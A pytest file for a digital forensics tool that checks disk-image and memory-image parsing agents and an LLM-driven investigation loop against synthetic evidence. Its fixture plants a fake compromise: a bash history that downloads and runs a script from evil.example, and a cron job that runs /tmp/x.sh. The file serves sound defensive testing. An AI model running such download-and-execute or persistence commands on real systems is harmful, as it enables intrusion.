"""Disk agent (dissect.target on a synthetic ext4 image), memory agent (canned Volatility JSON) and the investigate loop."""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from dfa.ingestion.detect import detect
from dfa.ingestion.parsers.base import ParseContext, load_all, parser_for

pytest.importorskip("dissect.target")


def _ext4_image(tmp_path: Path) -> Path:
    if not shutil.which("mkfs.ext4"):
        pytest.skip("mkfs.ext4 not available")
    root = tmp_path / "root"
    (root / "etc").mkdir(parents=True)
    (root / "home" / "alice").mkdir(parents=True)
    (root / "var" / "log").mkdir(parents=True)
    (root / "etc" / "passwd").write_text("root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
    (root / "etc" / "hostname").write_text("testhost\n")
    (root / "etc" / "crontab").write_text("* * * * * root /tmp/x.sh\n")
    (root / "home" / "alice" / ".bash_history").write_text("wget http://evil.example/x.sh\nchmod +x x.sh\n./x.sh\n")
    (root / "var" / "log" / "auth.log").write_text("Sep  1 13:47:02 testhost sshd[999]: Accepted password for alice from 10.0.4.17 port 5000 ssh2\n")
    img = tmp_path / "linux.img"
    r = subprocess.run(["mkfs.ext4", "-q", "-F", "-d", str(root), str(img), "16M"], capture_output=True, text=True, check=False)
    if r.returncode != 0:
        pytest.skip(f"mkfs.ext4 failed: {r.stderr.strip()[:200]}")
    return img


def test_disk_agent_ext4(tmp_path: Path):
    load_all()
    img = _ext4_image(tmp_path)
    assert detect(img).kind == "disk_image"
    agent = parser_for("disk_image")
    from dfa.agents.disk import DiskAgent

    assert isinstance(agent, DiskAgent)
    agent = DiskAgent()
    evs = list(agent.parse(img, ParseContext("c1")))
    info = evs[0]
    assert info.action == "disk_image_info" and info.host == "testhost" and "os=unix" in info.summary
    by = {}
    for e in evs[1:]:
        by.setdefault(e.action, []).append(e)
    assert {u.extra["name"] for u in by["user_account"]} == {"root", "alice"} and by["user_account"][0].category.value == "user_management"
    cmds = by["shell_command"]
    assert [c.extra["command"] for c in cmds] == ["wget http://evil.example/x.sh", "chmod +x x.sh", "./x.sh"] and cmds[0].user == "alice"
    assert "evil.example" in cmds[0].ioc.domain and cmds[0].category.value == "process" and cmds[0].host == "testhost"
    assert by["cron_job"][0].user == "root" and "/tmp/x.sh" in by["cron_job"][0].summary
    auth = by["auth_log"][0]
    assert auth.category.value == "authentication" and auth.ts_iso.endswith("-09-01T13:47:02Z") and "10.0.4.17" in auth.ioc.ip
    status = {r.name: r.status for r in agent.results}
    assert status["users"] == "ok" and status["commandhistory"] == "ok" and status["cronjobs"] == "ok" and status["authlog"] == "ok"
    assert status["docker.containers"] == "missing"  # not present on the image, reported not raised


def test_disk_agent_plugin_selection(tmp_path: Path):
    from dfa.agents.disk import DiskAgent

    img = _ext4_image(tmp_path)
    agent = DiskAgent(plugins=["users", "nonexistent.plugin"])
    evs = list(agent.parse(img, ParseContext("c1")))
    assert {e.action for e in evs} == {"disk_image_info", "user_account"}
    assert [(r.name, r.status) for r in agent.results] == [("users", "ok"), ("nonexistent.plugin", "missing")]


_CANNED = {
    "windows.info": [{"Variable": "NtProductType", "Value": "NtProductWinNt"}, {"Variable": "SystemTime", "Value": "2026-09-01 13:50:00"}],
    "windows.pslist": [
        {"PID": 4, "PPID": 0, "ImageFileName": "System", "CreateTime": "2026-09-01T08:00:00+00:00", "__children": []},
        {"PID": 600, "PPID": 4, "ImageFileName": "svchost.exe", "CreateTime": "2026-09-01T09:00:00+00:00", "__children": []},
        {"PID": 700, "PPID": 650, "ImageFileName": "winword.exe", "CreateTime": "2026-09-01T13:40:00+00:00", "__children": [
            {"PID": 710, "PPID": 700, "ImageFileName": "powershell.exe", "CreateTime": "2026-09-01T13:41:00+00:00", "__children": []}]},
    ],
    "windows.psscan": [{"PID": 4, "PPID": 0, "ImageFileName": "System", "CreateTime": "2026-09-01T08:00:00+00:00", "ExitTime": None},
                       {"PID": 999, "PPID": 4, "ImageFileName": "rootkit.exe", "CreateTime": "2026-09-01T13:45:00+00:00", "ExitTime": None},
                       {"PID": 800, "PPID": 4, "ImageFileName": "old.exe", "CreateTime": "2026-09-01T07:00:00+00:00", "ExitTime": "2026-09-01T07:30:00+00:00"}],
    "windows.netscan": [{"PID": 710, "Owner": "powershell.exe", "Proto": "TCPv4", "LocalAddr": "10.0.4.17", "LocalPort": 49812, "ForeignAddr": "203.0.113.77",
                         "ForeignPort": 443, "State": "ESTABLISHED", "Created": "2026-09-01T13:41:05+00:00"}],
    "windows.malfind": [{"PID": 710, "Process": "powershell.exe", "Start VPN": "0x1a0000", "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "4d 5a 90 00"}],
}


def test_memory_agent_canned(tmp_path: Path):
    from dfa.agents.memory import MemoryAgent

    load_all()
    img = tmp_path / "ws042.vmem"
    img.write_bytes(b"\x00" * 4096)
    assert detect(img).kind == "memory_image" and parser_for("memory_image") is not None
    agent = MemoryAgent(plugins=["windows.pslist", "windows.psscan", "windows.netscan", "windows.malfind", "windows.svcscan"])
    calls = []

    def fake_run(image, plugin, extra_args=None):
        calls.append(plugin)
        if plugin == "windows.svcscan":
            raise RuntimeError("symbol table not found")
        return _CANNED.get(plugin, [])

    agent._run = fake_run
    evs = list(agent.parse(img, ParseContext("c1", host_hint="WS042")))
    assert agent.os_name == "windows" and calls[0] == "windows.info"
    assert evs[0].action == "memory_image_info" and "NtProductType=NtProductWinNt" in evs[0].summary
    by = {}
    for e in evs[1:]:
        by.setdefault(e.action, []).append(e)
    ps = {e.extra["PID"]: e for e in by["mem_pslist"]}
    assert ps[710].extra["flags"] == ["office_spawned_shell"] and ps[710].extra["depth"] == 1 and ps[710].ts_iso == "2026-09-01T13:41:00Z"
    assert ps[600].extra["flags"] == ["unexpected_parent:system"] and ps[4].process == "System" and ps[4].category.value == "process"
    # every process row carries its parent's name and creation time (one-hop "parent of X" answers)
    rows = {r["PID"]: r for _, r in MemoryAgent._flatten(_CANNED["windows.pslist"]) if "PID" in r}
    for pid, e in ps.items():
        parent = rows.get(rows[pid].get("PPID"))
        if parent:
            assert e.extra["ParentImage"] == parent["ImageFileName"] and e.extra["ParentCreateTime"] == parent.get("CreateTime")
            assert f"ParentImage={parent['ImageFileName']}" in e.summary
    scan = {e.extra["PID"]: e for e in by["mem_psscan"]}
    assert scan[999].extra["flags"] == ["hidden_process"] and scan[800].extra["flags"] == ["terminated"] and scan[4].extra["flags"] == []
    net = by["mem_netscan"][0]
    assert net.category.value == "network" and net.process == "powershell.exe" and "203.0.113.77" in net.ioc.ip and net.extra["flags"] == ["established"]
    mal = by["mem_malfind"][0]
    assert mal.extra["flags"] == ["suspicious"] and "PAGE_EXECUTE_READWRITE" in mal.summary and mal.host == "WS042"
    runs = {r.name: r for r in agent.runs}
    assert runs["windows.svcscan"].status == "error" and "symbol table" in runs["windows.svcscan"].error and runs["windows.pslist"].rows == 4


def test_memory_agent_no_os(tmp_path: Path):
    from dfa.agents.memory import MemoryAgent

    img = tmp_path / "blob.raw"
    img.write_bytes(b"\x00" * 100)
    agent = MemoryAgent()
    agent._run = lambda image, plugin, extra_args=None: (_ for _ in ()).throw(RuntimeError("no symbols"))
    evs = list(agent.parse(img, ParseContext("c1")))
    assert len(evs) == 1 and "OS not identified" in evs[0].summary and agent.os_name is None


def test_investigate_loop(tmp_path: Path, monkeypatch):
    from dfa.agents import investigate as inv
    from dfa.config import get_settings
    from dfa.ingestion.schema import Event

    monkeypatch.setattr(get_settings(), "data_dir", tmp_path)

    def mk(n: int):
        return lambda: (Event(case_id="c1", source_file="img", record_ref=f"r{i}", summary=f"ev {i}", raw="") for i in range(n))

    cat = [inv.Extractor("disk:img:prefetch", "disk", Path("img"), "prefetch", "program execution", mk(3)),
           inv.Extractor("disk:img:mft", "disk", Path("img"), "mft", "every file", mk(2)),
           inv.Extractor("disk:img:broken", "disk", Path("img"), "broken", "fails", lambda: (_ for _ in ()).throw(RuntimeError("boom")))]
    monkeypatch.setattr(inv, "build_catalogue", lambda paths, ctx: cat)
    prompts = []

    class FakeLLM:
        def complete(self, prompt, system=None, max_tokens=None):
            prompts.append(prompt)
            if "Answer produced so far" not in prompt:
                return 'Sure: {"extractors": ["disk:img:prefetch", "2", "disk:img:prefetch", "nope"], "reason": "execution evidence"}'
            return '{"extractors": ["disk:img:broken"], "reason": "one more"}'

    indexed = []

    def fake_index(case_id, events):
        n = sum(1 for _ in events)
        indexed.append(n)
        return {"events": n, "chunks": n}

    answers = []

    def fake_ask(case_id, question, interface="cli", **kw):
        answers.append(interface)
        return SimpleNamespace(answer=f"answer {len(answers)}", citations=[{"label": "E1"}], to_dict=lambda: {"answer": "x"})

    res = inv.investigate("c1", [Path("img")], "what ran?", max_rounds=3, llm=FakeLLM(), indexer=fake_index, asker=fake_ask)
    assert [r.chosen for r in res.rounds] == [["disk:img:prefetch", "disk:img:mft"], ["disk:img:broken"]]
    assert res.rounds[0].events == {"disk:img:prefetch": 3, "disk:img:mft": 2} and indexed == [3, 2]
    assert res.rounds[1].errors["disk:img:broken"].startswith("RuntimeError: boom") and res.rounds[1].answer == "answer 2"
    assert answers == ["investigate", "investigate"] and res.answer.answer == "answer 2" and res.rounds[0].citations == 1
    state = inv.load_state("c1")
    assert set(state) == {"disk:img:prefetch", "disk:img:mft", "disk:img:broken"} and state["disk:img:prefetch"]["events"] == 3
    assert "(already extracted)" not in prompts[0] and "disk:img:prefetch (already extracted)" in prompts[1]
    # a second investigation on the same case starts from the recorded state: nothing left -> no extraction, one answer
    res2 = inv.investigate("c1", [Path("img")], "again?", max_rounds=2, llm=FakeLLM(), indexer=fake_index, asker=fake_ask)
    assert res2.rounds[0].chosen == [] and len(res2.rounds) == 1 and indexed == [3, 2]


def test_detect_images(tmp_path: Path):
    mbr = bytearray(1024)
    mbr[446] = 0x80
    mbr[450] = 0x07
    mbr[458:462] = (2048).to_bytes(4, "little")
    mbr[510:512] = b"\x55\xaa"
    (tmp_path / "disk.dd").write_bytes(bytes(mbr))
    assert detect(tmp_path / "disk.dd").kind == "disk_image"
    (tmp_path / "x.vmdk").write_bytes(b"KDMV" + b"\x00" * 600)
    assert detect(tmp_path / "x.vmdk").kind == "disk_image"
    (tmp_path / "mem.lime").write_bytes(b"EMiL" + b"\x00" * 600)
    assert detect(tmp_path / "mem.lime").kind == "lime"
    (tmp_path / "blob.bin").write_bytes(b"\x80\xff\x00\x13\xfe" * 300)
    assert detect(tmp_path / "blob.bin").kind == "binary"  # .bin blobs are app data, not memory images
    (tmp_path / "blob.xyz").write_bytes(b"\x80\xff\x00\x13\xfe" * 300)
    assert detect(tmp_path / "blob.xyz").kind == "binary"
